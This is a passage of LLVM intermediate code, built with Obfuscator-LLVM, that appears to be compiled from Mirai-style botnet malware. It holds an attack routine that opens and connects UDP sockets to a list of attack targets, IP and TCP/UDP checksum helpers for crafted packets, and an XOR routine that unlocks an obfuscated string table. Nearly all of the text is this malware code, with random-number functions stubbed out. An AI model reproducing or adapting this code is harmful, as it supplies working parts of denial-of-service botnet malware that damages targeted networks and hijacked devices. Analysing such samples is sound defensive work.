  %indvars.iv68 = phi i64 [ %indvars.iv.next69, %90 ], [ 0, %.lr.ph63.split.preheader ]
  %71 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %72 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv68
  store i8* %71, i8** %72, align 8
  %73 = call zeroext i16 @htons(i16 zeroext %12) #12
  %74 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv68
  %75 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv68, i32 0, i32 1
  store i16 %73, i16* %75, align 2
  %76 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %77 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv68
  store i32 %76, i32* %77, align 4
  %78 = icmp eq i32 %76, -1
  br i1 %78, label %.us-lcssa.us.loopexit74, label %79

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph63.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit74:                          ; preds = %.lr.ph63.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit74, %.us-lcssa.us.loopexit
  ret void

; <label>:79:                                     ; preds = %.lr.ph63.split
  store i16 2, i16* %28, align 4
  store i16 %.056, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %80 = call i32 @bind(i32 %76, %struct.sockaddr* nonnull %31, i32 16) #11
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv68, i32 2
  %82 = load i8, i8* %81, align 4
  %83 = icmp ult i8 %82, 32
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %79
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv68, i32 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @ntohl(i32 %86) #12
  %88 = call i32 @htonl(i32 %87) #12
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv68, i32 0, i32 2, i32 0
  store i32 %88, i32* %89, align 4
  br label %90

; <label>:90:                                     ; preds = %84, %79
  %91 = bitcast %struct.attack_target* %74 to %struct.sockaddr*
  %92 = call i32 @connect(i32 %76, %struct.sockaddr* %91, i32 16) #11
  %indvars.iv.next69 = add nuw nsw i64 %indvars.iv68, 1
  %93 = icmp slt i64 %indvars.iv.next69, %32
  br i1 %93, label %.lr.ph63.split, label %.preheader.loopexit75

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !4

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #8 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !6

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !7

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #12
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #9 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #10 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #10 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #10 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { nounwind }
attributes #12 = { nounwind readnone }
attributes #13 = { noreturn nounwind }
attributes #14 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = distinct !{!4, !5, !2, !3}
!5 = !{!"llvm.loop.unroll.runtime.disable"}
!6 = distinct !{!6, !2, !3}
!7 = distinct !{!7, !5, !2, !3}
